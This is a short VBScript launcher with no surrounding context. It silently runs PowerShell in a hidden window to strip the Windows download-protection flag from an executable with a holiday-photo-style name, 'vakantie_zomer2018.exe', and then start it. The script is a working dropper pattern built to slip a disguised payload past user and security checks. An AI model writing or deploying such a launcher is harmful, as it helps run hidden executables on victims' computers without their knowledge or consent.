Set sh = CreateObject("WScript.Shell")
path = Left(WScript.ScriptFullName, InStrRev(WScript.ScriptFullName, "\\"))
cmd = "powershell -WindowStyle Hidden -Command ""Unblock-File '" & path & "vakantie_zomer2018.exe'; Start-Process '" & path & "vakantie_zomer2018.exe'"""
sh.Run cmd, 0, False
